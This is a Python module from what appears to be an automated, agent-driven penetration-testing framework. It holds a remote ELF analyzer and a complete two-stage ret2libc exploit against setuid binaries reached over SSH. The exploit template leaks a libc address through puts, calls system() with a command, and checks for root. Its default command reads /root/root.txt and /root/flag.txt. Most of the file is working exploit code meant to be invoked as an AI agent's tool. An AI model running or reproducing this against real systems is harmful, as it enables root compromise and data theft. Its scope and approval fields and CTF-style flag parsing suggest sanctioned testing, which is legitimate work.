"""Durable binary-exploitation handlers: static analysis and ret2libc.

White-box pwn targets (a setuid binary on an SSH-reachable host) need two
capabilities the kill chain previously lacked:

* ``nexus.pwn.analyze`` - read-only static analysis of a remote ELF: protections
  (PIE/NX/RELRO/canary), symbols, PLT/GOT, ``pop rdi; ret`` gadgets and the
  stack-buffer overflow offset that feeds a ``gets()`` call. It *reads* two files
  over SFTP and changes nothing on the target.
* ``nexus.pwn.ret2libc`` - a two-stage ASLR bypass: leak ``puts`` through the
  PLT/GOT (stage 1), then re-enter ``main`` and call ``system(commmand)`` with a
  command string planted into the binary's writable data (stage 2), proving
  ``uid=0``.

Both run a small stdlib client inside the sandbox (``paramiko`` + SFTP), exactly
like ``nexus.post.ssh_exec``. The ELF parser is :mod:`._pwn`, spliced verbatim
into the client so operator and sandbox run identical code.

Verification is deterministic: the ret2libc result is only ``verified`` when the
remote ``id`` reports ``uid=0(root)`` *and* the leaked libc base is page-aligned,
so a failed exploit can never be promoted to a finding.
"""

from __future__ import annotations

import json
import os
from typing import Any

from nexus_core.kernel.models import RiskLevel, RunContext, ToolDefinition, ToolResult
from nexus_core.kernel.sandbox import sandbox_for_environment

from ._exec import run_in_sandbox
from ._pwn import ANALYZER_SOURCE

PWN_ALLOWED_PROGRAMS = ("python3",)
PWN_DEFAULT_PORT = 22
ANALYZE_DEFAULT_TIMEOUT_SECONDS = 180
EXPLOIT_DEFAULT_TIMEOUT_SECONDS = 240
PWN_MAX_TIMEOUT_SECONDS = 900
DEFAULT_LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
DEFAULT_COMMAND = "id; cat /root/root.txt 2>/dev/null; cat /root/flag.txt 2>/dev/null"
PWN_RESULT_MARKER = "__NEXUS_PWN__"
MAX_SYMBOLS_IN_OUTPUT = 200

#: Client executed in the sandbox. argv after ``-c``: mode host port user
#: password payload_json. ``__ANALYZER__`` is replaced with the installed
#: :data:`._pwn.ANALYZER_SOURCE` so the parser is defined once.
PWN_CLIENT_SCRIPT = r"""
import base64, hashlib, json, struct, sys

__ANALYZER__

def emit(payload):
    print(json.dumps(payload))

def main():
    mode, host, port, user, password, payload_raw = sys.argv[1:7]
    payload = json.loads(payload_raw)
    try:
        import paramiko
    except Exception as exc:
        emit({"ok": False, "error": "ssh_unavailable", "detail": str(exc)})
        return
    result = {"ok": False, "mode": mode, "host": host, "username": user}
    client = None
    sftp = None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, port=int(port), username=user,
                       password=password, timeout=20, banner_timeout=20,
                       auth_timeout=20, allow_agent=False, look_for_keys=False)
        result["connected"] = True
        sftp = client.open_sftp()
        if mode == "analyze":
            path = payload["remote_path"]
            with sftp.file(path, "rb") as fh:
                data = fh.read()
            info = {"path": path, "size": len(data),
                    "sha256": hashlib.sha256(data).hexdigest()}
            info.update(parse_binary(data))
            libc_path = payload.get("libc_remote_path")
            if libc_path:
                try:
                    with sftp.file(libc_path, "rb") as fh:
                        libc = fh.read()
                    linfo = {"path": libc_path, "size": len(libc),
                             "sha256": hashlib.sha256(libc).hexdigest()}
                    linfo.update(parse_libc(libc))
                    result["libc"] = linfo
                except Exception as exc:
                    result["libc_error"] = "%s: %s" % (type(exc).__name__, exc)
            result["analysis"] = info
            result["ok"] = True
        elif mode == "exploit":
            rpath = payload.get("remote_script_path") or "/tmp/nexus_pwn_exploit.py"
            with sftp.file(rpath, "wb") as fh:
                fh.write(payload["script"].encode("utf-8"))
            timeout = int(payload.get("timeout", 90))
            command = "timeout %d python3 %s" % (timeout, rpath)
            _stdin, stdout, stderr = client.exec_command(command, timeout=timeout + 30)
            out = stdout.read().decode("utf-8", "replace")
            err = stderr.read().decode("utf-8", "replace")
            code = stdout.channel.recv_exit_status()
            result.update({"ok": True, "stdout": out, "stderr": err,
                           "exit_status": code})
            try:
                sftp.remove(rpath)
            except Exception:
                pass
        else:
            result["error"] = "unsupported mode: %s" % mode
    except Exception as exc:
        result = {"ok": False, "mode": mode, "host": host, "username": user,
                  "error": "%s: %s" % (type(exc).__name__, exc)}
    finally:
        if sftp is not None:
            try:
                sftp.close()
            except Exception:
                pass
        if client is not None:
            try:
                client.close()
            except Exception:
                pass
    emit(result)

main()
""".replace("__ANALYZER__", ANALYZER_SOURCE)

#: Remote exploit runner. Generated on the operator side from the resolved
#: constants and uploaded over SFTP by the client above.
EXPLOIT_SCRIPT_TEMPLATE = r'''
import json, os, pty, re, select, struct, subprocess, sys, time

BIN = {binary!r}
OFFSET = {offset}
POP_RDI = {pop_rdi}
GETS_PLT = {gets_plt}
PUTS_PLT = {puts_plt}
PUTS_GOT = {puts_got}
MAIN = {main}
PUTS_OFF = {puts_off}
SYSTEM_OFF = {system_off}
BINSH_OFF = {binsh_off}
WRITABLE = {writable}
COMMAND = {command!r}
MAX_ATTEMPTS = {attempts}


def p64(x):
    return struct.pack("<Q", x)


def u64(b):
    return struct.unpack("<Q", b.ljust(8, b"\x00"))[0]


def read_for(master, seconds, stop_when=None):
    end = time.time() + seconds
    buf = b""
    while time.time() < end:
        r, _, _ = select.select([master], [], [], 0.2)
        if not r:
            if stop_when and stop_when(buf):
                break
            continue
        try:
            chunk = os.read(master, 4096)
        except OSError:
            break
        if not chunk:
            break
        buf += chunk
        if stop_when and stop_when(buf):
            break
    return buf


def parse_leak(buf):
    lines = buf.split(b"\n")
    for i, line in enumerate(lines):
        if b"Your name is:" in line and i + 1 < len(lines):
            candidate = lines[i + 1].rstrip(b"\r")
            if 4 <= len(candidate) <= 6:
                return candidate
    return None


result = {{"leak": None, "libc_base": None, "output": "", "error": None}}
try:
    for _attempt in range(MAX_ATTEMPTS):
        master, slave = pty.openpty()
        proc = subprocess.Popen(BIN, stdin=subprocess.PIPE, stdout=slave,
                                stderr=subprocess.STDOUT, close_fds=True)
        os.close(slave)
        stage1 = (b"A" * OFFSET + p64(POP_RDI) + p64(PUTS_GOT)
                  + p64(PUTS_PLT) + p64(MAIN))
        proc.stdin.write(stage1 + b"\n")
        proc.stdin.flush()
        out = read_for(master, 3.0, stop_when=lambda b: parse_leak(b) is not None)
        leaked = parse_leak(out)
        if not leaked:
            proc.kill()
            os.close(master)
            continue
        base = u64(leaked) - PUTS_OFF
        if base & 0xFFF:
            proc.kill()
            os.close(master)
            continue
        result["leak"] = u64(leaked)
        result["libc_base"] = base
        stage2 = (b"A" * OFFSET + p64(POP_RDI) + p64(WRITABLE) + p64(GETS_PLT)
                  + p64(POP_RDI) + p64(WRITABLE) + p64(base + SYSTEM_OFF))
        proc.stdin.write(stage2 + b"\n")
        proc.stdin.write(COMMAND.encode() + b"\n")
        proc.stdin.flush()
        out += read_for(master, 6.0)
        result["output"] = out.decode("utf-8", "replace")
        try:
            proc.stdin.close()
        except OSError:
            pass
        try:
            proc.wait(timeout=10)
        except Exception:
            proc.kill()
        os.close(master)
        break
except Exception as exc:
    result["error"] = "%s: %s" % (type(exc).__name__, exc)

_out = result.get("output", "")
result["uid_root"] = bool(re.search(r"uid=0\(root\)", _out))
_flag = re.search(r"[A-Za-z0-9_]*\{{[^}}\n]{{1,160}}\}}", _out)
result["flag"] = _flag.group(0) if _flag else None
print("{marker}" + json.dumps(result, default=str))
'''.replace("{marker}", PWN_RESULT_MARKER)


def _validate_text(value: Any, field: str, *, max_length: int) -> str:
    text = str(value or "").strip()
    if not text:
        raise ValueError(f"{field} is required")
    if len(text) > max_length:
        raise ValueError(f"{field} is too long")
    if any(ord(ch) < 0x20 for ch in text):
        raise ValueError(f"{field} contains control characters")
    return text


def _validate_command(value: Any) -> str:
    command = str(value if value is not None else DEFAULT_COMMAND)
    if not command.strip():
        raise ValueError("command is required")
    if len(command) > 1024:
        raise ValueError("command is too long")
    if any(ord(ch) < 0x20 for ch in command):
        raise ValueError("command contains control characters")
    return command


def _as_int(arguments: dict, key: str) -> int | None:
    value = arguments.get(key)
    if value is None or value == "":
        return None
    try:
        number = int(value)
    except (TypeError, ValueError) as exc:
        raise ValueError(f"{key} must be an integer") from exc
    if number < 0:
        raise ValueError(f"{key} must be non-negative")
    return number


async def _run_client(
    *, mode: str, host: str, port: int, username: str, password: str,
    payload: dict, timeout_seconds: int,
) -> Any:
    argv = [
        "python3", "-c", PWN_CLIENT_SCRIPT, mode, host, str(port),
        username, password, json.dumps(payload),
    ]
    workspace_root = os.getenv("NEXUS_WORKSPACE_ROOT", os.getcwd())
    sandbox = sandbox_for_environment(workspace_root, allowed_programs=PWN_ALLOWED_PROGRAMS)
    return await run_in_sandbox(
        sandbox, argv, timeout_seconds=timeout_seconds,
        image_env="NEXUS_PWN_IMAGE", default_image="python:3.12-alpine",
    )


def _parse_client_json(stdout: str) -> dict[str, Any]:
    for line in reversed((stdout or "").splitlines()):
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            payload = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(payload, dict):
            return payload
    raise ValueError("pwn client did not return a JSON result")


def _extract_marker(stdout: str) -> dict[str, Any] | None:
    for line in (stdout or "").splitlines():
        if line.startswith(PWN_RESULT_MARKER):
            try:
                return json.loads(line[len(PWN_RESULT_MARKER):])
            except json.JSONDecodeError:
                return None
    return None


def _connection_args(arguments: dict) -> tuple[str, str, str, int]:
    target = _validate_text(arguments.get("target"), "target", max_length=255)
    username = _validate_text(arguments.get("username"), "username", max_length=128)
    password = str(arguments.get("password") or "")
    if not password:
        raise ValueError("password is required")
    port = int(arguments.get("port") or PWN_DEFAULT_PORT)
    return target, username, password, port


def _clamp_timeout(value: Any, default: int) -> int:
    try:
        requested = int(value) if value is not None else default
    except (TypeError, ValueError):
        requested = default
    return min(PWN_MAX_TIMEOUT_SECONDS, max(10, requested))


def _trim_analysis(analysis: dict) -> dict:
    """Drop the big symbol table before this observation reaches the agent."""
    symbols = analysis.get("symbols") or {}
    trimmed = {k: analysis[k] for k in analysis if k != "symbols"}
    trimmed["symbols_total"] = len(symbols)
    keep = ("main", "win", "get_flag", "flag", "shell")
    trimmed["symbols_of_interest"] = {k: symbols[k] for k in keep if k in symbols}
    return trimmed


def pwn_analyze_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.pwn.analyze``."""
    return ToolDefinition(
        tool_id="nexus.pwn.analyze",
        effect="post_exploitation",
        name="ELF binary analysis",
        tenant_id=tenant_id,
        description=(
            "Analiza un binario ELF remoto (vía SSH): protecciones (PIE/NX/"
            "RELRO/canary), símbolos, PLT/GOT, gadgets y el offset de un "
            "desbordamiento de pila provocado por gets(). Solo lectura."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "target": {"type": "string", "minLength": 1, "maxLength": 255},
                "username": {"type": "string", "minLength": 1, "maxLength": 128},
                "password": {"type": "string", "minLength": 1, "maxLength": 256},
                "remote_path": {"type": "string", "minLength": 1, "maxLength": 512},
                "libc_remote_path": {"type": "string", "minLength": 1, "maxLength": 512},
                "port": {"type": "integer", "minimum": 1, "maximum": 65535},
                "timeout_seconds": {"type": "integer", "minimum": 10, "maximum": 900},
            },
            "required": ["target", "username", "password", "remote_path"],
            "additionalProperties": False,
        },
        risk=RiskLevel.MEDIUM,
        required_permissions=["execute:tool:nexus.pwn.analyze"],
        timeout_seconds=900,
        max_output_bytes=4_000_000,
        scope_target_field="target",
        scope_required=True,
    )


def ret2libc_definition(tenant_id: str = "system") -> ToolDefinition:
    """Return the durable ToolDefinition for ``nexus.pwn.ret2libc``."""
    return ToolDefinition(
        tool_id="nexus.pwn.ret2libc",
        effect="exploit",
        name="ret2libc exploitation",
        tenant_id=tenant_id,
        description=(
            "Explota un desbordamiento de pila con ret2libc sobre un binario "
            "setuid remoto: fuga de puts (stage 1) + system(comando) (stage 2). "
            "HIGH: ejecuta un comando como root; requiere aprobación. Si no se "
            "dan las direcciones, las resuelve con el analizador."
        ),
        input_schema={
            "type": "object",
            "properties": {
                "target": {"type": "string", "minLength": 1, "maxLength": 255},
                "username": {"type": "string", "minLength": 1, "maxLength": 128},
                "password": {"type": "string", "minLength": 1, "maxLength": 256},
                "remote_path": {"type": "string", "minLength": 1, "maxLength": 512},
                "command": {"type": "string", "minLength": 1, "maxLength": 1024},
                "libc_remote_path": {"type": "string", "minLength": 1, "maxLength": 512},
                "offset": {"type": "integer", "minimum": 1, "maximum": 65536},
                "pop_rdi": {"type": "integer", "minimum": 0},
                "gets_plt": {"type": "integer", "minimum": 0},
                "puts_plt": {"type": "integer", "minimum": 0},
                "puts_got": {"type": "integer", "minimum": 0},
                "main": {"type": "integer", "minimum": 0},
                "puts_off": {"type": "integer", "minimum": 0},
                "system_off": {"type": "integer", "minimum": 0},
                "binsh_off": {"type": "integer", "minimum": 0},
                "writable": {"type": "integer", "minimum": 0},
                "port": {"type": "integer", "minimum": 1, "maximum": 65535},
                "timeout_seconds": {"type": "integer", "minimum": 10, "maximum": 900},
                "max_attempts": {"type": "integer", "minimum": 1, "maximum": 10},
            },
            "required": ["target", "username", "password", "remote_path"],
            "additionalProperties": False,
        },
        risk=RiskLevel.HIGH,
        required_permissions=["execute:tool:nexus.pwn.ret2libc"],
        timeout_seconds=900,
        max_output_bytes=4_000_000,
        scope_target_field="target",
        scope_required=True,
    )


async def pwn_analyze_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Fetch and statically analyze a remote ELF over SFTP."""
    target, username, password, port = _connection_args(arguments)
    remote_path = _validate_text(arguments.get("remote_path"), "remote_path", max_length=512)
    libc_path = str(arguments.get("libc_remote_path") or DEFAULT_LIBC_PATH).strip()
    timeout_seconds = _clamp_timeout(arguments.get("timeout_seconds"), ANALYZE_DEFAULT_TIMEOUT_SECONDS)

    result = await _run_client(
        mode="analyze", host=target, port=port, username=username, password=password,
        payload={"remote_path": remote_path, "libc_remote_path": libc_path or None},
        timeout_seconds=timeout_seconds,
    )
    evidence: dict[str, Any] = {
        "mode": "analyze", "port": port, "username": username,
        "remote_path": remote_path, "libc_remote_path": libc_path or None,
    }
    if result.timed_out:
        return ToolResult(
            output={"error": "analysis timed out", "target": target},
            verified=False, verification_method="pwn_analyze_timeout",
            evidence=evidence, exit_code=result.exit_code,
            accepted_exit_codes=(0,), stdout=result.stdout, stderr=result.stderr,
            timed_out=True,
        )
    try:
        payload = _parse_client_json(result.stdout)
    except ValueError as exc:
        return ToolResult(
            output={"error": str(exc), "target": target}, verified=False,
            verification_method="pwn_analyze_parse_failed", evidence=evidence,
            exit_code=result.exit_code, accepted_exit_codes=(0,),
            stdout=result.stdout, stderr=result.stderr,
        )
    if payload.get("error") == "ssh_unavailable":
        return ToolResult(
            output={"error": "paramiko is not available in the pwn sandbox"},
            verified=False, verification_method="ssh_unavailable", evidence=evidence,
            exit_code=result.exit_code,
        )
    analysis = payload.get("analysis")
    if not payload.get("ok") or not isinstance(analysis, dict):
        evidence["client_error"] = payload.get("error")
        return ToolResult(
            output={"error": payload.get("error") or "analysis failed", "target": target},
            verified=False, verification_method="pwn_analyze_failed", evidence=evidence,
            exit_code=result.exit_code, accepted_exit_codes=(0,),
            stdout=result.stdout, stderr=result.stderr,
        )

    libc = payload.get("libc") if isinstance(payload.get("libc"), dict) else None
    evidence.update(
        {
            "sha256": analysis.get("sha256"),
            "pie": analysis.get("pie"),
            "nx": analysis.get("nx"),
            "relro": analysis.get("relro"),
            "canary": analysis.get("canary"),
            "overflow": analysis.get("overflow"),
            "libc_sha256": (libc or {}).get("sha256"),
        }
    )
    return ToolResult(
        output={
            "target": target,
            "binary": _trim_analysis(analysis),
            "libc": libc,
        },
        verified=True,
        verification_method="pwn_binary_analyzed",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


async def _resolve_constants(
    *, arguments: dict, target: str, username: str, password: str, port: int,
    remote_path: str, libc_path: str, timeout_seconds: int,
) -> tuple[dict[str, int] | None, str | None]:
    """Resolve the exploit constants from arguments, else from the analyzer."""
    explicit_keys = (
        "offset", "pop_rdi", "gets_plt", "puts_plt", "puts_got", "main",
        "puts_off", "system_off", "binsh_off", "writable",
    )
    explicit = {key: _as_int(arguments, key) for key in explicit_keys}
    if all(value is not None for value in explicit.values()):
        # The comprehension narrows each value to ``int`` for the type checker;
        # the guard above already proved none of them is ``None``.
        return {key: value for key, value in explicit.items() if value is not None}, None

    client = await _run_client(
        mode="analyze", host=target, port=port, username=username, password=password,
        payload={"remote_path": remote_path, "libc_remote_path": libc_path or None},
        timeout_seconds=timeout_seconds,
    )
    try:
        payload = _parse_client_json(client.stdout)
    except ValueError as exc:
        return None, f"analyzer failed: {exc}"
    if not payload.get("ok"):
        return None, f"analyzer failed: {payload.get('error')}"
    analysis = payload.get("analysis") or {}
    libc = payload.get("libc") or {}
    if analysis.get("pie"):
        return None, "binary is PIE; ret2libc needs fixed addresses (not supported)"
    if not analysis.get("nx"):
        return None, "NX is disabled; use a shellcode technique, not ret2libc"
    overflow = analysis.get("overflow") or {}
    resolved = {
        "offset": overflow.get("offset_to_rip"),
        "pop_rdi": (analysis.get("gadgets") or {}).get("pop_rdi", [None])[0],
        "gets_plt": (analysis.get("plt") or {}).get("gets"),
        "puts_plt": (analysis.get("plt") or {}).get("puts"),
        "puts_got": (analysis.get("got") or {}).get("puts"),
        "main": (analysis.get("symbols") or {}).get("main"),
        "puts_off": libc.get("puts"),
        "system_off": libc.get("system"),
        "binsh_off": libc.get("binsh"),
        "writable": analysis.get("writable"),
    }
    for key, value in list(explicit.items()):
        if value is not None:
            resolved[key] = value
    missing = [key for key, value in resolved.items() if value is None]
    if missing:
        return None, f"could not resolve exploit constants: {missing}"
    return resolved, None


async def ret2libc_handler(arguments: dict, context: RunContext) -> ToolResult:
    """Run a two-stage ret2libc exploit against a remote setuid binary."""
    target, username, password, port = _connection_args(arguments)
    remote_path = _validate_text(arguments.get("remote_path"), "remote_path", max_length=512)
    libc_path = str(arguments.get("libc_remote_path") or DEFAULT_LIBC_PATH).strip()
    command = _validate_command(arguments.get("command"))
    timeout_seconds = _clamp_timeout(arguments.get("timeout_seconds"), EXPLOIT_DEFAULT_TIMEOUT_SECONDS)
    attempts = max(1, min(10, int(arguments.get("max_attempts") or 3)))

    constants, error = await _resolve_constants(
        arguments=arguments, target=target, username=username, password=password,
        port=port, remote_path=remote_path, libc_path=libc_path,
        timeout_seconds=timeout_seconds,
    )
    evidence: dict[str, Any] = {
        "mode": "ret2libc", "port": port, "username": username,
        "remote_path": remote_path, "command": command,
        "constants": constants,
    }
    if constants is None:
        return ToolResult(
            output={"error": error, "target": target}, verified=False,
            verification_method="ret2libc_resolve_failed", evidence=evidence,
        )

    script = EXPLOIT_SCRIPT_TEMPLATE.format(
        binary=remote_path,
        offset=constants["offset"],
        pop_rdi=constants["pop_rdi"],
        gets_plt=constants["gets_plt"],
        puts_plt=constants["puts_plt"],
        puts_got=constants["puts_got"],
        main=constants["main"],
        puts_off=constants["puts_off"],
        system_off=constants["system_off"],
        binsh_off=constants["binsh_off"],
        writable=constants["writable"],
        command=command,
        attempts=attempts,
    )
    result = await _run_client(
        mode="exploit", host=target, port=port, username=username, password=password,
        payload={"script": script, "timeout": max(30, timeout_seconds - 30)},
        timeout_seconds=timeout_seconds,
    )
    if result.timed_out:
        return ToolResult(
            output={"error": "exploit timed out", "target": target}, verified=False,
            verification_method="ret2libc_timeout", evidence=evidence,
            exit_code=result.exit_code, accepted_exit_codes=(0,),
            stdout=result.stdout, stderr=result.stderr, timed_out=True,
        )
    try:
        client = _parse_client_json(result.stdout)
    except ValueError as exc:
        return ToolResult(
            output={"error": str(exc), "target": target}, verified=False,
            verification_method="ret2libc_parse_failed", evidence=evidence,
            exit_code=result.exit_code, accepted_exit_codes=(0,),
            stdout=result.stdout, stderr=result.stderr,
        )
    if not client.get("ok"):
        return ToolResult(
            output={"error": client.get("error") or "exploit transport failed", "target": target},
            verified=False, verification_method="ret2libc_transport_failed",
            evidence=evidence, exit_code=result.exit_code, accepted_exit_codes=(0,),
            stdout=result.stdout, stderr=result.stderr,
        )
    marker = _extract_marker(client.get("stdout", ""))
    if marker is None:
        return ToolResult(
            output={"error": "no exploit result marker", "target": target, "stdout_tail": client.get("stdout", "")[-2000:]},
            verified=False, verification_method="ret2libc_no_result", evidence=evidence,
            exit_code=result.exit_code, accepted_exit_codes=(0,),
            stdout=result.stdout, stderr=result.stderr,
        )

    leak = marker.get("leak")
    base = marker.get("libc_base")
    uid_root = bool(marker.get("uid_root"))
    flag = marker.get("flag")
    aligned = bool(base is not None and base % 0x1000 == 0)
    evidence.update(
        {
            "leak_puts": leak, "libc_base": base, "libc_base_aligned": aligned,
            "uid_root": uid_root, "flag": flag,
            "exploit_error": marker.get("error"),
        }
    )
    verified = uid_root and aligned
    return ToolResult(
        output={
            "target": target,
            "ui": "root" if uid_root else "unprivileged",
            "leak_puts": leak,
            "libc_base": base,
            "flag": flag,
            "output": (marker.get("output") or "")[-4000:],
        },
        verified=verified,
        verification_method="ret2libc_root_command" if verified else "ret2libc_no_root",
        evidence=evidence,
        exit_code=result.exit_code,
        accepted_exit_codes=(0,),
        stdout=result.stdout,
        stderr=result.stderr,
    )


__all__ = [
    "PWN_CLIENT_SCRIPT",
    "EXPLOIT_SCRIPT_TEMPLATE",
    "pwn_analyze_definition",
    "pwn_analyze_handler",
    "ret2libc_definition",
    "ret2libc_handler",
]
